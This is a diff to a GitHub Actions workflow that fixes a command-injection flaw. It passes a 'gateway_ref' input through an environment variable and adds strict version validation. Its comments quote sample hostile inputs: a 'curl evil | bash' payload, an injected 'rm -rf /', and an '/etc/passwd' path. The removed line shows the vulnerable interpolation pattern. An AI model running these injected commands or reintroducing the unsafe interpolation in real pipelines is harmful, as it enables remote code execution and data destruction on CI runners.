@@ -487,8 +487,24 @@ jobs:
 
       - name: Override GATEWAY_REF when one was supplied
         if: inputs.gateway_ref != ''
+        # NEVER interpolate `${{ ... }}` into a run: block. Actions expands it
+        # into the script TEXT before bash runs, so an input like
+        # `x"; curl evil | bash #` executes on the runner (CWE-78). Passing it
+        # through env: makes it data to bash instead of code. Beyond
+        # exfiltration, RCE here would let an attacker force this job to report
+        # success, defeating the required interop gate.
+        env:
+          GATEWAY_REF_INPUT: ${{ inputs.gateway_ref }}
         run: |
-          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${{ inputs.gateway_ref }}/" .github/upstream-compat.env
+          # Anchored regex, not a `case` glob: `v[0-9]*.[0-9]*.[0-9]*` lets `*`
+          # swallow anything after the last digit, so it accepts
+          # `v1.2.3; rm -rf /` and `v1.2.3/etc/passwd`. A `/` also collides
+          # with sed's s/// delimiter.
+          if [[ "$GATEWAY_REF_INPUT" != "latest" && ! "$GATEWAY_REF_INPUT" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "error: gateway_ref must be 'latest' or vN.N.NN, got: $GATEWAY_REF_INPUT" >&2
+            exit 1
+          fi
+          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${GATEWAY_REF_INPUT}/" .github/upstream-compat.env
           cat .github/upstream-compat.env
 
       - name: Resolve upstream references
